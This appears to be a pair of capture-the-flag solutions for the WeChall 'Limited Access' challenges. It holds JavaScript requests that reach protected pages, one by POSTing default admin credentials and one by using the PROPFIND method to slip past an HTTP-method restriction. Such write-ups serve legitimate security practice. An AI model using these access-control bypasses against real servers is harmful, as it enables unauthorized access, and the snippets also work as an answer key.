## Limited Access

tmp = new XMLHttpRequest();
tmp.open("POST", "http://www.wechall.net/challenge/wannabe7331/limited_access/protected/protected.php", true);
tmp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
tmp.send("id=admin&pw=admin");

## Limited Access Too

tmp = new XMLHttpRequest();
tmp.open("PROPFIND", "http://www.wechall.net/challenge/wannabe7331/limited_access_too/protected/protected.php")
tmp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
tmp.send();
